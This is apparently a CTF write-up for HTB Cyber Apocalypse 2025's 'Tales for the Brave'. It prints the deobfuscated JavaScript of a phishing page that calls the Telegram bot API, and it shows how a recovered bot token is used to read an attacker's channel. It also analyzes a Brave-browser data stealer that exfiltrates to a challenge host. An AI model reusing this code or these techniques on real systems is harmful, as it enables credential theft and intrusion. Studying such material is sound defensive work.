---
title: "HTB Cyber Apocalypse 2025 Writeup - Tales for the Brave"
date: 2025-03-26
draft: false
description: "Writeup for some challenges that I solved in HackTheBox Cyber Apocalypse 2025."
tags: ["ctf", "writeup", "Reverse Engineering", "Forensics", "Machine Learning"]
# series: ["Documentation"]
# series_order: 13
---

## Overview

This week I played HTB Cyber Apocalypse 2025 and did all Forensics challenges!!!! 

![overview](img/overview.png)

In this writeup, I'll walk through how I solved the last Forensics challenge - "Tales for the Brave". 

## What da website doin'?

After spawning the instance, we'll see this website:

![img1](img/img1.png)

Since the challenge's description says the website "may secretly trap unsuspecting visitors, leading them into a complex phishing scheme", it's a good idea to check the website's source code. In the `JS` folder, there is a file named `index.js`. You can see the source code [here](src/index.js).

This is clearly an obfuscated code. We can see an `eval` call in the code. This will run whatever code that is passed to the function. To know what it ran, we can replace `eval` with `console.log` to print out the code. We can even beautify the code using [this website](https://deobfuscate.io/). Note that this will replace `String.fromCharCode(n)` with the actual character, even non-printable ones. The beautified code can be seen [here](src/beautify.js). Let's break this down.

First, this code defines some sort of array:

```js
var _$_8b18 = function (k, j) {
    var y = k.length;
    var o = [];
    for (var m = 0; m < y; m++) {
      o[m] = k.charAt(m);
    }
    ;
    for (var m = 0; m < y; m++) {
      var b = j * (m + 143) + j % 34726;
      var r = j * (m + 91) + j % 23714;
      var v = b % y;
      var s = r % y;
      var f = o[v];
      o[v] = o[s];
      o[s] = f;
      j = (b + r) % 4449625;
    }
    ;
    var a = String.fromCharCode(127);
    var i = "";
    var e = "\\x25";
    var q = "\\x23\\x31";
    var t = "\\x25";
    var h = "\\x23\\x30";
    var w = "\\x23";
    return o.join(i).split(e).join(a).split(q).join(t).split(h).join(w).split(a);
  }("shfnemBLlerpitrtgt%ld%DmvuFeceaEaladerletdtdtsputpnielEvae%%iansn%eimkei%guLt%d%i%tsv%ds%eltee%ewssmnnvdsaiyrroeesmlc@Feroieoel%bt%lIota", 3827531);
```

We can get this value directly from the web terminal:

```js
> _$_8b18
(15) ['submit', 'preventDefault', 'email', 'getElementById', 'descriptionField', 'value', 'shake', 'add', 'classList', 'remove', '@', 'split', 'log', 'addEventListener', 'newsletterForm']
```

With this, we can easily deobfuscate the next part:

```js
document["getElementById"]("newsletterForm")["addEventListener"]("submit", function (e) {
    e['preventDefault']();
    const emailField = document["getElementById"]("email");
    const descriptionField = document["getElementById"]('descriptionField');
    let isValid = true;
    if (!emailField["value"]) {
      emailField['classList']['add']('shake');
      isValid = false;
      setTimeout(() => {
        return emailField['classList']['remove']('shake');
      }, 500);
    }
    ;
    if (!isValid) {
      return;
    }
    ;
    const emailValue = emailField["value"];
    const specialKey = emailValue['split']('@')[0];
    const desc = parseInt(descriptionField["value"], 10);
    f(specialKey, desc);
  });
```

This code add an event listener for `submit`, which extract `specialKey` (the part before `@` of the email) and the description `desc`. Then they are passed to the function `f`. 

Next, the function `G(r)` just seems to decode some strings, so we'll ignore this for now. After this is another array `_$_5975`, which we can also get from the terminal:

```js
> _$_5975
(31) ['nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==', 's3cur3k3y', 'Base64', 'enc', 'toString', '', 'join', 'SHA256', '18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=', 'Utf8', 'parse', 'decrypt', 'RC4Drop', 'https://api.telegram.org', 'fromCharCode', 'onreadystatechange', 'readyState', 'DONE', 'responseText', 'text', 'result', 'log', 'replace', 'location', 'Form submitted!', 'GET', 'forwardMessage?chat_id=', '&from_chat_id=', '&message_id=5', 'open', 'send']
```

Using this, we can deobfuscate the function `f`:

```js
function f(oferkfer, icd) {
    const channel_id = -1002496072246;
    var enc_token = 'nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==';
    if (oferkfer === G('s3cur3k3y') 
    && CryptoJS['SHA256'](sequence['join'](''))['toString'](CryptoJS['enc']['Base64']) === '18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=') {
        var decrypted = CryptoJS['RC4Drop']['decrypt'](enc_token, CryptoJS['enc']['Utf8']['parse'](oferkfer), {drop: 192})['toString'](CryptoJS['enc']['Utf8']);
        var HOST = 'https://api.telegram.org' + String['fromCharCode'](47) + String['fromCharCode'](98) + String['fromCharCode'](111) + String['fromCharCode'](116) + decrypted;
        var xhr = new XMLHttpRequest;
        xhr['onreadystatechange'] = function () {
            if (xhr['readyState'] == XMLHttpRequest['DONE']) {
                const resp = JSON['parse'](xhr['responseText']);
                try {
                    const link = resp['result']['text'];
                    window['location']['replace'](link);
                } catch (error) {
                    alert('Form submitted!');
                }
            }
        };
        xhr['open']('GET', HOST + String['fromCharCode'](47) + 'forwardMessage?chat_id=' + icd + '&from_chat_id=' + channel_id + '&message_id=5');
        xhr['send'](null);
    } else {
        alert('Form submitted!');
    }
  }
```

If we look back at the previous parts, we can see the use of `f(specialKey, desc)`. The function `f` will first check `specialKey === G('s3cur3k3y')` and check some kind of sequence. `sequence` is defined after this function, and is storing which box has changed state (checked/unchecked):

{{<details title="Show code">}}
```js
var sequence = [];
  ;
  function l() {
    sequence.push(this.id);
  }
  var checkboxes = document["querySelectorAll"]("input[class=cb]");
  for (var i = 0; i < checkboxes["length"]; i++) {
    checkboxes[i]["addEventListener"]("change", l);
  }
```
{{</details>}}

The main thing we want to get here is the Telegram API link. To get this, we can simply copy the codes into the terminal:

```js
> const channel_id = -1002496072246;
> var enc_token = 'nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==';
> var decrypted = CryptoJS['RC4Drop']['decrypt'](enc_token, CryptoJS['enc']['Utf8']['parse'](oferkfer), {drop: 192})['toString'](CryptoJS['enc']['Utf8']);
> var HOST = 'https://api.telegram.org' + String['fromCharCode'](47) + String['fromCharCode'](98) + String['fromCharCode'](111) + String['fromCharCode'](116) + decrypted;
> var icd = 123456 // Sample id
> HOST + String['fromCharCode'](47) + 'forwardMessage?chat_id=' + icd + '&from_chat_id=' + channel_id + '&message_id=5'
'https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id=123456&from_chat_id=-1002496072246&message_id=5'
```

And here's our link: `https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id=123456&from_chat_id=-1002496072246&message_id=5`

## Telegram exloration

Having the bot token `7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc` and the telegram id `-1002496072246`, we can forward all messages from the hacker's channel to our chat. First, we need to get the bot information using `getme`: `https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/getme`

We get the username of the bot: `OperationEldoriaBot`. Now we can start a chat with the bot by finding this username on Telegram and send `/start`. Make sure you use a socket account to not leak your id (people might forward spam you lol).

After starting the chat, we'll forward all messages from the hacker's channel to this chat. To do that we need our current chat's `chat_id`. There are two ways to get this. The first way is to call `getUpdates` API. The second way is to message `@userinfobot`. Now we can forward the messages: 
```
https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id=67[REDACTED]60&from_chat_id=-1002496072246&message_id=5
```

Call the API request using all `message_id` starting from 1 to get all messages (another way to do this is to set `message_id` to an array like `[1,2,3,4,5,6,...]`, but this doesn't work in this case because some messages are missing.) 

After forwarding all messages, we can see that the hacker sent a Brave stealer in a zip file, and a password `dr4g0nsh34rtb3l0ngst0m4l4k4r`. Without any more info, analyze the malware seems to be the only way. Let's extract this zip file and see what this malware do!

{{< alert "lightbulb" >}}
Although HTB malwares are mostly harmless, it's always a good idea to analyze this using a Virtual Machine
{{< /alert >}}

## Malware analysis (attempt)

First, let's check the type of file:

```
Brave.exe: PE32+ executable (console) x86-64, for MS Windows, 8 sections
```

Hmmmm, not a .NET file huh. I thought to myself "This is a forensics challenge, I shouldn't have to reverse this right?" So I analyse this malware using `any.run`. The analysis only shows that it reads a `localdb` file from the Brave installation folder. Gaining nothing from this, I guess I must reverse this malware then. 

(My teammate somehow got a better analysis, you can check it [here](https://app.any.run/tasks/63b85713-e486-4bab-b5d5-e92a51bb1f9e)).


## .NET AOT Reversing
One weird thing is when I ran `string` on the binary, I got some strings like `D:\Brave\bin\Release\net8.0\win-x64\native\Brave.pdb`. But `file` command didn't recognize this as a .NET binary. I tried tools like `DNSpy` and `ILSpy` but they cannot read this binary. So what is this? After a conversation with ChatGPT, I found out that is .NET binary is compiled with using Ahead Of Time (AOT) compilation.

A .NET AOT binary usually contains a `.managed` and a `hydrated` sections (like the image below), and a string which looks something like this: `8.0.8+08338fcaa5c9b9a8190abb99222fed12aaba956c`

![img2](img/img2.png)

As per [this post](https://harfanglab.io/insidethelab/reverse-engineering-ida-pro-aot-net/), I need to create a signature file to load the binary in IDA. After a while, I got myself a `.sig` file. Let's open IDA to analyze this binary.

To locate the `main` function of this binary, I compared the code to the code of the binary used to generate the signature file:

![img3](img/img3.png)

Inside `__managed__Main`:

![img4](img/img4.png)

`sub_1400D08B0` doesn't contain anything special. All the good stuff is in `sub_14006C9D0`. Since the code is still kinda hard to understand, and hydrated data is only loaded during runtime, I think that it's time to debug this program! Let's put a breakpoint at `sub_14006C9D0` and step in this function.

I noticed some interesting stuff in this part:

```c
v1 = sub_140071FC0(28LL, 0LL);
return sub_14006BBC0(v1);
```

After running the first line, some libraries are loaded. These libraries seems to be used in `sub_14006BBC0`, so let's step in this function.

Inside this function, we can see some functions like `String__Concat`, `GetString`, ... My approach to this is to debug through each line and see what string each value contains. For example, after this line below, i'll click the variable `String` and see the string inside:

```c
String = S_P_CoreLib_System_Text_UTF8Encoding_UTF8EncodingSealed__GetString(v2, v3);
```

The result will be like this image below. We can see there's the pointer to the string buffer, the string length, and the actual string in UTF-16 encoding. In this case, the string is `BraveSoftware\Brave-Browser\User Data\\`

![img5](img/img5.png)

Repeating this for each line, and we can somewhat understand the program flow. Here's the flow:

- The program checks if the file `C:\Users\<username>\AppData\Local\BraveSoftware\Brave-Browser\User Data\\Default\Local Storage\leveldb` exists. If the file doesn't exist, the program exits.
- Then, the program creates a folder at `C:\Users\<username>\AppData\Local\Temp\zgo123`.
- After this, the function `sub_7FF70B9CC1E0` will try to connect to `zOlsc2S65u.htb`. If failed, the program exits. 

The GOLD is in this function. The variable `v12` contains strings that looks like HTTP header. One of them is this:

```
{"Accept":"*/*","Content-Type":"application/json","Authorization":"Bearer Token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcm9tIjoiY29zdGkiLCJjYW1wYWlnbl9pZCI6Ik9wZXJhdGlvbiBFbGRvcmlhIDogRXhwb3NpbmcgdGhlIGJyYXZlcyIsImF1dGgiOiJVMFpTUTJVd1JsRldSamxxVFVjMWVtTkVSbmxPUjAxNFRUTk9abGxxVG05TlZ6VnJXREpKZW1KcVJtNWliRGx6VFVSQ2NrMVhOVzVZTTAxNFpFUk9lbVpSUFQwPSJ9.HelK5pTs6fenv8TKmAPrV3tzhSZm4GEAnEV9vBBtAzg","Connection":"Close"}
```

Decoding this token, we get this:

```json
{
    "from": "costi",
    "campaign_id": "Operation Eldoria : Exposing the braves",
    "auth": "U0ZSQ2UwRlFWRjlqTUc1emNERnlOR014TTNOZllqTm9NVzVrWDJJemJqRm5ibDlzTURCck1XNW5YM014ZEROemZRPT0="
}
```

Base64 decode `auth` twice, we'll get the flag: `HTB{APT_c0nsp1r4c13s_b3h1nd_b3n1gn_l00k1ng_s1t3s}`

## Bonus: The rest of the flow
After checking connection, the program will copy some important Brave file to `Temp\zgo123` and try to send that to the server. The files that are sent are as follows:

![img6](img/img6.png)

Finally, it will delete the files in `zgo123` and exit the program.

## Conclusion

This was one hell of a bad trip for me. Overall, I really enjoyed this year's challenges. They are not too hard, and some contains very interesting new knowledges. HackTheBox Cyber Apocalypse has always been one of my favourite CTF, and I can't wait until next year CTF.